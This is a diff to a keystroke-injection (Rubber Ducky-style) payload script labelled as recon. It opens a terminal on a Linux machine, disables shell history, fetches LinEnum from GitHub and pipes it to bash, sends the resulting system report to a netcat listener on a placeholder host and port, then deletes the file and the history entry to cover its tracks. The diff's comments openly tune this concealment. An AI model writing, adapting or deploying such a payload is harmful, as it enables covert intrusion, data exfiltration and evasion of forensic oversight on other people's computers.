@@ -7,14 +7,14 @@ REM Category: Recon
 REM Launches terminal, turns off history, launches LinEnum in the background, uploads the report to your nc listener and covers tracks.
 DELAY 300
 CTRL-ALT+t
-DELAY 1000
-STRING nohup curl -s -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash >treasure.txt && nc "receiving.host.ip" "port" < treasure.txt && rm treasure.txt && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
+DELAY 1500
+REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the history command entry ;)
+STRING set +o history
 DELAY 300
+ENTER
+REM launch recon and exfil then cover your tracks
+STRING nohup curl -s -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash >treasure.txt && nc "receiving.host.ip" "port" < treasure.txt && rm treasure.txt && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history &
+DELAY 500
 ENTER
 DELAY 500
-CTRL c
-DELAY 1500
-CTRL c
-STRING exit
-DELAY 300
-ENTER
+ALT F4
